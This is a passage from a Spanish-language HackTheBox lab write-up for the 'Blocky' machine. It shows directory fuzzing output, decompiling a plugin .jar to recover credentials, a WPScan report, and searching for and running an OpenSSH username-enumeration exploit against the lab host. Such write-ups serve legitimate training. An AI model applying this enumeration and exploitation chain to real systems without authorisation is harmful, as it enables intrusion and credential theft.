+</span></span><span style="display:flex;"><span>000000014:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch        <span style="color:#e6db74">&#34;http://blocky.htb//&#34;</span>                                                       
+</span></span><span style="display:flex;"><span>000000519:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">37</span> L     <span style="color:#ae81ff">61</span> W       <span style="color:#ae81ff">745</span> Ch      <span style="color:#e6db74">&#34;plugins&#34;</span>                                                                   
+</span></span><span style="display:flex;"><span>000000786:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">200</span> L    <span style="color:#ae81ff">2015</span> W     <span style="color:#ae81ff">40838</span> Ch    <span style="color:#e6db74">&#34;wp-includes&#34;</span>                                                               
+</span></span><span style="display:flex;"><span>000001073:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">11</span> L     <span style="color:#ae81ff">32</span> W       <span style="color:#ae81ff">296</span> Ch      <span style="color:#e6db74">&#34;javascript&#34;</span>                                                                
+</span></span><span style="display:flex;"><span>000000083:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">11</span> L     <span style="color:#ae81ff">32</span> W       <span style="color:#ae81ff">291</span> Ch      <span style="color:#e6db74">&#34;icons&#34;</span>                                                                     
+</span></span><span style="display:flex;"><span>000007180:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch        <span style="color:#e6db74">&#34;wp-admin&#34;</span>                                                                  
+</span></span><span style="display:flex;"><span>000000190:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">10</span> L     <span style="color:#ae81ff">51</span> W       <span style="color:#ae81ff">380</span> Ch      <span style="color:#e6db74">&#34;wiki&#34;</span>                                                                      
+</span></span><span style="display:flex;"><span>000010825:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">25</span> L     <span style="color:#ae81ff">347</span> W      <span style="color:#ae81ff">10304</span> Ch    <span style="color:#e6db74">&#34;phpmyadmin&#34;</span>                                                                
+</span></span><span style="display:flex;"><span>000045240:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch        <span style="color:#e6db74">&#34;http://blocky.htb//&#34;</span>                                                       
+</span></span><span style="display:flex;"><span>000095524:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">11</span> L     <span style="color:#ae81ff">32</span> W       <span style="color:#ae81ff">299</span> Ch      <span style="color:#e6db74">&#34;server-status&#34;</span>                                                             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 510.1105
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">220560</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">220536</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 432.3768
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Bien, ahora probemos con <strong>Gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://blocky.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.5
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://blocky.htb/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/wiki                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 307<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://blocky.htb/wiki/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://blocky.htb/wp-content/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/plugins              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 310<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://blocky.htb/plugins/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://blocky.htb/wp-includes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/javascript           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://blocky.htb/javascript/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 311<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://blocky.htb/wp-admin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://blocky.htb/phpmyadmin/<span style="color:#f92672">]</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay varios que podemos ver, el que me llama la atención es el <strong>wp-includes</strong>, veamos que hay ahí.</p>
+<p><img src="/assets/images/htb-writeup-blocky/Captura9.png" alt=""></p>
+<p>Son varios archivos y la página es muy lenta cuando intentamos abrir algún archivo y cuando lo abrimos no hay nada, es decir, que no podemos ver el contenido de los archivos, pero si ver que existen.</p>
+<p>Bueno veamos que hay en plugins.</p>
+<p><img src="/assets/images/htb-writeup-blocky/Captura10.png" alt=""></p>
+<p>Ok, si les damos click a esos archivos se pueden descargar, pero&hellip; ¿qué es la extensión <strong>.jar</strong>?:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Archivos .jar</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Un archivo JAR es un tipo de archivo que permite ejecutar aplicaciones y herramientas escritas en el lenguaje Java. Las siglas están deliberadamente escogidas para que coincidan con la palabra inglesa &ldquo;jar&rdquo;. Los archivos JAR están comprimidos con el formato ZIP y cambiada su extensión a .jar.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Entonces, son <strong>archivos comprimidos de Java</strong>, tratemos de ver su interior.</p>
+<p>Para esto, es necesario descompilarlo porque no podremos abrir uno de estos archivos, a menos que tengamos <strong>Java</strong> para poder abrirlo y verlo y posiblemente este contenga una contraseña, entonces busquemos una herramienta para descompilar estos archivos.</p>
+<h3 id="Java">Analizando Archivo .jar</h3>
+<p>Encontre una: <a href="http://java-decompiler.github.io/" target="_blank">Java Decompiler</a></p>
+<p>Bien, instalémosla en nuestro equipo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt install jd-gui
+</span></span></code></pre></div><p>Una vez instalada, solo ponemos <strong>jd-gui</strong> para abrirla, así igual abrimos el <strong>BurpSuite</strong> solo poniendo el nombre en un terminal y yasta.</p>
+<p><img src="/assets/images/htb-writeup-blocky/Captura11.png" alt=""></p>
+<p>Bien, como nos indica ahí vamos a cargar los archivos, primero veamos el <strong>BlockyCore.jar</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura12.png">
+</p>
+<p>Si no mal recuerdo de mis autoclases de <strong>Java</strong>, el cuadro amarillo debe ser una clase, veamos que contenido tiene:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura13.png">
+</p>
+<p>En efecto, es una clase, veamos el contenido:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura14.png">
+</p>
+<p>Ya tenemos un usuario y la contraseña del Root, quiza <strong>notch</strong> es el Root o no sé, hay que probarlo.</p>
+<h3 id="wpscan">Utilizando la Herramienta WPScan</h3>
+<p>Antes de seguir avanzando, me gustaría probar una nueva herramienta que no había probado antes. Esta es una herramienta bastante útil, a la hora de buscar vulnerabilidades dentro de un <strong>Wordpress</strong>.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Herramienta WPScan</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>WPScan es un software de código abierto para Kali Linux, diseñado para escanear vulnerabilidades y fallos en un sitio web de WordPress. WPScan es una herramienta muy poderosa y capaz de darte información detallada sobre una página web. Con ella, puedes auditar sistemas, verificar su estado y corregir cada fallo que encuentres antes de que lo aproveche un delincuente.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Vamos a utilizarla para ver que nos reporta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://blocky.htb
+</span></span><span style="display:flex;"><span>_______________________________________________________________
+</span></span><span style="display:flex;"><span>         __          _______   _____
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
+</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">&#39;_ \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         WordPress Security Scanner by the WPScan Team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                         Version 3.8.22
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       Sponsored by Automattic - https://automattic.com/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_______________________________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] URL: http://blocky.htb/ [10.10.10.37]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Interesting Finding(s):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Headers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Headers (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | References:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress readme found: http://blocky.htb/readme.html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 60%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | References:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Rss Generator (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - http://blocky.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - http://blocky.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress theme in use: twentyseventeen
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Last Updated: 2024-04-02T00:00:00.000Z
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | [!] The version is out of date, the latest version is 3.6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Style Name: Twenty Seventeen
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Style URI: https://wordpress.org/themes/twentyseventeen/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Author: the WordPress team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Author URI: https://wordpress.org/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Css Style In Homepage (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Version: 1.3 (80% confidence)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Style (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: &#39;</span>Version: 1.3<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating All Plugins <span style="color:#f92672">(</span>via Passive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> No plugins Found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Config Backups <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> Checking Config Backups - Time: 00:00:03 &lt;<span style="color:#f92672">============================================================================================================================================================</span>&gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">137</span> / 137<span style="color:#f92672">)</span> 100.00% Time: 00:00:03
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> No Config Backups Found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> You can get a free API token with <span style="color:#ae81ff">25</span> daily requests by registering at https://wpscan.com/register
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">139</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">37</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 33.996 KB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 19.874 KB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 258.684 MB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:00:10
+</span></span></code></pre></div><p>No nos reporta algo que nos pueda ser de utilidad de momento, aunque lo de los <strong>Template</strong> me da una idea. Bueno, sigamos con la explotación.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="SSH">Forma de Enumerar Usuarios de SSH</h3>
+<p>Esta vez investigamos bien al encontrar un usuario, pero ¿cómo sabremos si existe un usuario en un <strong>servicio SSH</strong> en el futuro? Por ejemplo, en <strong>Windows</strong> podemos usar <strong>Crackmapexec</strong> para el servicio <strong>SMB</strong>, pero aquí eso no sirve, así que hay que buscar una manera.</p>
+<p>Después de investigar un rato, gracias a <strong>HackTricks</strong> se puede enumerar los usuarios de un servicio <strong>SSH</strong> usando <strong>Metasploit</strong>, así que existe un Exploit que nos permita esto:</p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh" target="_blank">HackTricks: 22 - Pentesting SSH/SFTP</a></li>
+</ul>
+<p>Investigando un Exploit, encontré este:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/45233" target="_blank">OpenSSH 2.3 &lt; 7.7 - Username Enumeration</a></li>
+</ul>
+<p>Este nos sirve para la versión de <strong>SSH</strong> que esta usando la máquina, pues es <strong>OpenSSH 7.2</strong>. Busquémoslo con <strong>Searchsploit</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit OpenSSH 7.2           
+</span></span><span style="display:flex;"><span>----------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                             |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                   | linux/remote/45233.py
+</span></span><span style="display:flex;"><span>OpenSSH 2.3 &lt; 7.7 - Username Enumeration <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span>                                                             | linux/remote/45210.py
+</span></span><span style="display:flex;"><span>OpenSSH 7.2 - Denial of Service                                                                            | linux/dos/40888.py
+</span></span><span style="display:flex;"><span>OpenSSH 7.2p1 - <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> xauth Command Injection                                                    | multiple/remote/39569.py
+</span></span><span style="display:flex;"><span>OpenSSH 7.2p2 - Username Enumeration                                                                       | linux/remote/40136.py
+</span></span><span style="display:flex;"><span>OpenSSH &lt; 7.4 - <span style="color:#e6db74">&#39;UsePrivilegeSeparation Disabled&#39;</span> Forwarded Unix Domain Sockets Privilege Escalation       | linux/local/40962.txt
+</span></span><span style="display:flex;"><span>OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                   | linux/remote/40963.txt
+</span></span><span style="display:flex;"><span>OpenSSH &lt; 7.7 - User Enumeration <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                       | linux/remote/45939.py
+</span></span><span style="display:flex;"><span>OpenSSHd 7.2p2 - Username Enumeration                                                                      | linux/remote/40113.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>Incluso hay varias versiones, pero probemos el <strong>Username Enumeration (2)</strong> porque el que encontramos en internet no funciona.</p>
+<h4 id="PruebaExp">Probando Exploit: OpenSSH &lt; 7.7 - Username Enumeration (2)</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m linux/remote/45939.py
+</span></span><span style="display:flex;"><span>  Exploit: OpenSSH &lt; 7.7 - Username Enumeration <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/45939
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
+</span></span><span style="display:flex;"><span>    Codes: CVE-2018-15473
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: Python script, ASCII text executable
+</span></span></code></pre></div><p>Bien, analizándolo un poco, veo mucho que ocupa la librería <strong>Paramiko</strong>, vamos a instalarla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install paramiko      
+</span></span><span style="display:flex;"><span>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span style="color:#66d9ef">for</span> Python 2.7 in January 2021. More details about Python <span style="color:#ae81ff">2</span> support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support <span style="color:#66d9ef">for</span> this functionality
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Listo, ahora probemos si nos da indicaciones sobre cómo usarlo, usaremos Python 2 porque con los otros no quiso correr:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 SSH_Exploit.py
+</span></span><span style="display:flex;"><span>/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python <span style="color:#ae81ff">2</span> is no longer supported by the Python core team. Support <span style="color:#66d9ef">for</span> it is now deprecated in cryptography, and will be removed in the next release.
+</span></span><span style="display:flex;"><span>  from cryptography.hazmat.backends import default_backend
+</span></span><span style="display:flex;"><span>usage: SSH_Exploit.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-p PORT<span style="color:#f92672">]</span> target username
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SSH User Enumeration by Leap Security <span style="color:#f92672">(</span>@LeapSecurity<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>positional arguments:
+</span></span><span style="display:flex;"><span>  target                IP address of the target system
+</span></span><span style="display:flex;"><span>  username              Username to check <span style="color:#66d9ef">for</span> validity.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>optional arguments:
+</span></span><span style="display:flex;"><span>  -h, --help            show this help message and exit
+</span></span><span style="display:flex;"><span>  -p PORT, --port PORT  Set port of SSH service
+</span></span></code></pre></div><p>Ok, entonces hay que indicarle la IP de la máquina y el usuario, nos pide el puerto también, pero es opcional así que no lo pondré.</p>
+<p>Usemos el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 SSH_Exploit.py 10.10.10.37 notch   
+</span></span><span style="display:flex;"><span>/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python <span style="color:#ae81ff">2</span> is no longer supported by the Python core team. Support <span style="color:#66d9ef">for</span> it is now deprecated in cryptography, and will be removed in the next release.
